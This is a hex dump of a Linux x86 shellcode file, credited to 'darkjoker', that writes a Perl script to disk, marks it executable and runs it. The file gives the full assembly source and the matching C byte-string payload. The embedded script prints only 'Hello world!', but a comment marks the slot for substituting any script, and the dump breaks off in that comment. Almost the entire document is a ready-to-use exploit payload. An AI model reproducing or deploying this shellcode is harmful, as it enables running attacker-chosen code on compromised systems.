00000000  2f 2a 0d 0a 41 75 74 68  6f 72 20 20 20 20 3a 20  |/*..Author    : |
00000010  64 61 72 6b 6a 6f 6b 65  72 0d 0a 53 69 74 65 20  |darkjoker..Site |
00000020  20 20 20 20 20 3a 20 68  74 74 70 3a 2f 2f 64 61  |     : http://da|
00000030  72 6b 6a 6f 6b 65 72 2e  6e 65 74 32 33 2e 6e 65  |rkjoker.net23.ne|
00000040  74 0d 0a 53 68 65 6c 6c  63 6f 64 65 20 3a 20 6c  |t..Shellcode : l|
00000050  69 6e 75 78 2f 78 38 36  20 50 65 72 6c 20 73 63  |inux/x86 Perl sc|
00000060  72 69 70 74 20 65 78 65  63 75 74 69 6f 6e 20 39  |ript execution 9|
00000070  39 20 62 79 74 65 73 20  2b 20 73 63 72 69 70 74  |9 bytes + script|
00000080  20 6c 65 6e 67 74 68 0d  0a 0d 0a 0d 0a 20 20 20  | length......   |
00000090  20 20 20 20 20 2e 67 6c  6f 62 61 6c 20 5f 73 74  |     .global _st|
000000a0  61 72 74 0d 0a 0d 0a 5f  73 74 61 72 74 3a 0d 0a  |art...._start:..|
000000b0  20 20 20 20 20 20 20 20  78 6f 72 20 20 20 20 20  |        xor     |
000000c0  25 65 61 78 2c 20 25 65  61 78 0d 0a 20 20 20 20  |%eax, %eax..    |
000000d0  20 20 20 20 78 6f 72 20  20 20 20 20 25 65 62 78  |    xor     %ebx|
000000e0  2c 20 25 65 62 78 0d 0a  20 20 20 20 20 20 20 20  |, %ebx..        |
000000f0  78 6f 72 20 20 20 20 20  25 65 63 78 2c 20 25 65  |xor     %ecx, %e|
00000100  63 78 0d 0a 20 20 20 20  20 20 20 20 78 6f 72 20  |cx..        xor |
00000110  20 20 20 20 25 65 64 78  2c 20 25 65 64 78 0d 0a  |    %edx, %edx..|
00000120  20 20 20 20 20 20 20 20  78 6f 72 20 20 20 20 20  |        xor     |
00000130  25 65 64 69 2c 20 25 65  64 69 0d 0a 20 20 20 20  |%edi, %edi..    |
00000140  20 20 20 20 78 6f 72 20  20 20 20 20 25 65 73 69  |    xor     %esi|
00000150  2c 20 25 65 73 69 0d 0a  20 20 20 20 20 20 20 20  |, %esi..        |
00000160  70 75 73 68 20 20 20 20  25 65 61 78 0d 0a 20 20  |push    %eax..  |
00000170  20 20 20 20 20 20 70 75  73 68 20 20 20 20 24 30  |      push    $0|
00000180  78 36 63 37 30 32 65 33  30 0d 0a 20 20 20 20 20  |x6c702e30..     |
00000190  20 20 20 70 75 73 68 20  20 20 20 24 30 78 33 30  |   push    $0x30|
000001a0  33 30 37 34 37 30 0d 0a  20 20 20 20 20 20 20 20  |307470..        |
000001b0  70 75 73 68 20 20 20 20  24 30 78 36 39 37 32 36  |push    $0x69726|
000001c0  33 37 33 0d 0a 0d 0a 20  20 20 20 20 20 20 20 6d  |373....        m|
000001d0  6f 76 20 20 20 20 20 25  65 73 70 2c 20 25 65 62  |ov     %esp, %eb|
000001e0  78 0d 0a 20 20 20 20 20  20 20 20 6d 6f 76 62 20  |x..        movb |
000001f0  20 20 20 24 30 78 35 2c  20 25 61 6c 0d 0a 20 20  |   $0x5, %al..  |
00000200  20 20 20 20 20 20 6d 6f  76 62 20 20 20 20 24 30  |      movb    $0|
00000210  78 34 31 2c 20 25 63 6c  0d 0a 20 20 20 20 20 20  |x41, %cl..      |
00000220  20 20 69 6e 74 20 20 20  20 20 24 30 78 38 30 0d  |  int     $0x80.|
00000230  0a 20 20 20 20 20 20 20  20 6a 6d 70 20 20 20 20  |.        jmp    |
00000240  20 6f 6e 65 0d 0a 0d 0a  74 77 6f 3a 0d 0a 0d 0a  | one....two:....|
00000250  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 20  |        mov     |
00000260  25 65 62 78 2c 20 25 65  73 69 0d 0a 20 20 20 20  |%ebx, %esi..    |
00000270  20 20 20 20 6d 6f 76 20  20 20 20 20 25 65 61 78  |    mov     %eax|
00000280  2c 20 25 65 62 78 0d 0a  0d 0a 20 20 20 20 20 20  |, %ebx....      |
00000290  20 20 70 6f 70 20 20 20  20 20 25 65 64 69 0d 0a  |  pop     %edi..|
000002a0  0d 0a 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |..        push  |
000002b0  20 20 25 65 64 69 0d 0a  0d 0a 09 2f 2f 20 42 65  |  %edi.....// Be|
000002c0  67 69 6e 20 68 74 74 70  3a 2f 2f 77 77 77 2e 69  |gin http://www.i|
000002d0  6e 74 38 30 68 2e 6f 72  67 2f 73 74 72 6c 65 6e  |nt80h.org/strlen|
000002e0  2f 0d 0a 09 78 6f 72 20  20 20 20 20 25 65 63 78  |/...xor     %ecx|
000002f0  2c 20 25 65 63 78 0d 0a  20 20 20 20 20 20 20 20  |, %ecx..        |
00000300  78 6f 72 20 20 20 20 20  25 65 61 78 2c 20 25 65  |xor     %eax, %e|
00000310  61 78 0d 0a 20 20 20 20  20 20 20 20 6e 6f 74 20  |ax..        not |
00000320  20 20 20 20 25 65 63 78  0d 0a 20 20 20 20 20 20  |    %ecx..      |
00000330  20 20 72 65 70 6e 65 20  20 20 73 63 61 73 62 0d  |  repne   scasb.|
00000340  0a 20 20 20 20 20 20 20  20 6e 6f 74 20 20 20 20  |.        not    |
00000350  20 25 65 63 78 0d 0a 20  20 20 20 20 20 20 20 64  | %ecx..        d|
00000360  65 63 20 20 20 20 20 25  65 63 78 0d 0a 09 2f 2f  |ec     %ecx...//|
00000370  20 45 6e 64 20 20 20 68  74 74 70 3a 2f 2f 77 77  | End   http://ww|
00000380  77 2e 69 6e 74 38 30 68  2e 6f 72 67 2f 73 74 72  |w.int80h.org/str|
00000390  6c 65 6e 2f 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |len/....        |
000003a0  70 6f 70 20 20 20 20 20  25 65 64 69 0d 0a 20 20  |pop     %edi..  |
000003b0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 20 25 65  |      mov     %e|
000003c0  63 78 2c 20 25 65 61 78  0d 0a 20 20 20 20 20 20  |cx, %eax..      |
000003d0  20 20 6d 6f 76 20 20 20  20 20 25 65 64 69 2c 20  |  mov     %edi, |
000003e0  25 65 63 78 0d 0a 20 20  20 20 20 20 20 20 6d 6f  |%ecx..        mo|
000003f0  76 20 20 20 20 20 25 65  61 78 2c 20 25 65 64 78  |v     %eax, %edx|
00000400  0d 0a 0d 0a 20 20 20 20  20 20 20 20 6d 6f 76 62  |....        movb|
00000410  20 20 20 20 24 30 78 34  2c 20 25 61 6c 0d 0a 20  |    $0x4, %al.. |
00000420  20 20 20 20 20 20 20 69  6e 74 20 20 20 20 20 24  |       int     $|
00000430  30 78 38 30 0d 0a 0d 0a  20 20 20 20 20 20 20 20  |0x80....        |
00000440  6d 6f 76 62 20 20 20 20  24 30 78 36 2c 20 25 61  |movb    $0x6, %a|
00000450  6c 0d 0a 20 20 20 20 20  20 20 20 69 6e 74 20 20  |l..        int  |
00000460  20 20 20 24 30 78 38 30  0d 0a 0d 0a 20 20 20 20  |   $0x80....    |
00000470  20 20 20 20 6d 6f 76 20  20 20 20 20 25 65 73 69  |    mov     %esi|
00000480  2c 20 25 65 62 78 0d 0a  20 20 20 20 20 20 20 20  |, %ebx..        |
00000490  6d 6f 76 62 20 20 20 20  24 30 78 66 2c 20 25 61  |movb    $0xf, %a|
000004a0  6c 0d 0a 20 20 20 20 20  20 20 20 6d 6f 76 77 20  |l..        movw |
000004b0  20 20 20 24 30 78 31 66  63 2c 20 25 63 78 0d 0a  |   $0x1fc, %cx..|
000004c0  20 20 20 20 20 20 20 20  69 6e 74 20 20 20 20 20  |        int     |
000004d0  24 30 78 38 30 0d 0a 0d  0a 20 20 20 20 20 20 20  |$0x80....       |
000004e0  20 6d 6f 76 62 20 20 20  20 24 30 78 62 2c 20 25  | movb    $0xb, %|
000004f0  61 6c 0d 0a 20 20 20 20  20 20 20 20 78 6f 72 20  |al..        xor |
00000500  20 20 20 20 25 65 63 78  2c 20 25 65 63 78 0d 0a  |    %ecx, %ecx..|
00000510  20 20 20 20 20 20 20 20  78 6f 72 20 20 20 20 20  |        xor     |
00000520  25 65 64 78 2c 20 25 65  64 78 0d 0a 20 20 20 20  |%edx, %edx..    |
00000530  20 20 20 20 69 6e 74 20  20 20 20 20 24 30 78 38  |    int     $0x8|
00000540  30 0d 0a 0d 0a 20 20 20  20 20 20 20 20 6d 6f 76  |0....        mov|
00000550  62 20 20 20 20 24 30 78  31 2c 20 25 61 6c 0d 0a  |b    $0x1, %al..|
00000560  20 20 20 20 20 20 20 20  78 6f 72 20 20 20 20 20  |        xor     |
00000570  25 65 62 78 2c 20 25 65  62 78 0d 0a 20 20 20 20  |%ebx, %ebx..    |
00000580  20 20 20 20 69 6e 74 20  20 20 20 20 24 30 78 38  |    int     $0x8|
00000590  30 0d 0a 0d 0a 6f 6e 65  3a 0d 0a 20 20 20 20 20  |0....one:..     |
000005a0  20 20 20 63 61 6c 6c 20  20 20 20 74 77 6f 0d 0a  |   call    two..|
000005b0  20 20 20 20 20 20 20 20  2e 73 74 72 69 6e 67 20  |        .string |
000005c0  22 23 21 2f 75 73 72 2f  62 69 6e 2f 70 65 72 6c  |"#!/usr/bin/perl|
000005d0  5c 6e 70 72 69 6e 74 20  28 5c 22 48 65 6c 6c 6f  |\nprint (\"Hello|
000005e0  20 77 6f 72 6c 64 21 5c  5c 6e 5c 22 29 3b 5c 6e  | world!\\n\");\n|
000005f0  22 0d 0a 2a 2f 0d 0a 63  68 61 72 20 6d 61 69 6e  |"..*/..char main|
00000600  20 5b 5d 20 3d 20 0d 0a  22 5c 78 33 31 5c 78 63  | [] = .."\x31\xc|
00000610  30 5c 78 33 31 5c 78 64  62 5c 78 33 31 5c 78 63  |0\x31\xdb\x31\xc|
00000620  39 5c 78 33 31 5c 78 64  32 22 0d 0a 22 5c 78 33  |9\x31\xd2".."\x3|
00000630  31 5c 78 66 66 5c 78 33  31 5c 78 66 36 5c 78 35  |1\xff\x31\xf6\x5|
00000640  30 5c 78 36 38 5c 78 33  30 5c 78 32 65 22 0d 0a  |0\x68\x30\x2e"..|
00000650  22 5c 78 37 30 5c 78 36  63 5c 78 36 38 5c 78 37  |"\x70\x6c\x68\x7|
00000660  30 5c 78 37 34 5c 78 33  30 5c 78 33 30 5c 78 36  |0\x74\x30\x30\x6|
00000670  38 22 0d 0a 22 5c 78 37  33 5c 78 36 33 5c 78 37  |8".."\x73\x63\x7|
00000680  32 5c 78 36 39 5c 78 38  39 5c 78 65 33 5c 78 62  |2\x69\x89\xe3\xb|
00000690  30 5c 78 30 35 22 0d 0a  22 5c 78 62 31 5c 78 34  |0\x05".."\xb1\x4|
000006a0  31 5c 78 63 64 5c 78 38  30 5c 78 65 62 5c 78 33  |1\xcd\x80\xeb\x3|
000006b0  38 5c 78 38 39 5c 78 64  65 22 0d 0a 22 5c 78 38  |8\x89\xde".."\x8|
000006c0  39 5c 78 63 33 5c 78 35  66 5c 78 35 37 5c 78 33  |9\xc3\x5f\x57\x3|
000006d0  31 5c 78 63 39 5c 78 33  31 5c 78 63 30 22 0d 0a  |1\xc9\x31\xc0"..|
000006e0  22 5c 78 66 37 5c 78 64  31 5c 78 66 32 5c 78 61  |"\xf7\xd1\xf2\xa|
000006f0  65 5c 78 66 37 5c 78 64  31 5c 78 34 39 5c 78 35  |e\xf7\xd1\x49\x5|
00000700  66 22 0d 0a 22 5c 78 38  39 5c 78 63 38 5c 78 38  |f".."\x89\xc8\x8|
00000710  39 5c 78 66 39 5c 78 38  39 5c 78 63 32 5c 78 62  |9\xf9\x89\xc2\xb|
00000720  30 5c 78 30 34 22 0d 0a  22 5c 78 63 64 5c 78 38  |0\x04".."\xcd\x8|
00000730  30 5c 78 62 30 5c 78 30  36 5c 78 63 64 5c 78 38  |0\xb0\x06\xcd\x8|
00000740  30 5c 78 38 39 5c 78 66  33 22 0d 0a 22 5c 78 62  |0\x89\xf3".."\xb|
00000750  30 5c 78 30 66 5c 78 36  36 5c 78 62 39 5c 78 66  |0\x0f\x66\xb9\xf|
00000760  63 5c 78 30 31 5c 78 63  64 5c 78 38 30 22 0d 0a  |c\x01\xcd\x80"..|
00000770  22 5c 78 62 30 5c 78 30  62 5c 78 33 31 5c 78 63  |"\xb0\x0b\x31\xc|
00000780  39 5c 78 33 31 5c 78 64  32 5c 78 63 64 5c 78 38  |9\x31\xd2\xcd\x8|
00000790  30 22 0d 0a 22 5c 78 62  30 5c 78 30 31 5c 78 33  |0".."\xb0\x01\x3|
000007a0  31 5c 78 64 62 5c 78 63  64 5c 78 38 30 5c 78 65  |1\xdb\xcd\x80\xe|
000007b0  38 5c 78 63 33 22 0d 0a  22 5c 78 66 66 5c 78 66  |8\xc3".."\xff\xf|
000007c0  66 5c 78 66 66 22 0d 0a  22 23 21 2f 75 73 72 2f  |f\xff".."#!/usr/|
000007d0  62 69 6e 2f 70 65 72 6c  5c 6e 70 72 69 6e 74 20  |bin/perl\nprint |
000007e0  28 5c 22 48 65 6c 6c 6f  20 77 6f 72 6c 64 21 5c  |(\"Hello world!\|
000007f0  5c 6e 5c 22 29 3b 5c 6e  22 3b 20 2f 2f 20 48 65  |\n\");\n"; // He|
00000800  72 65 20 73 63 72 69 70  74 20 73 6f 75 72 63 65  |re script source|
00000810
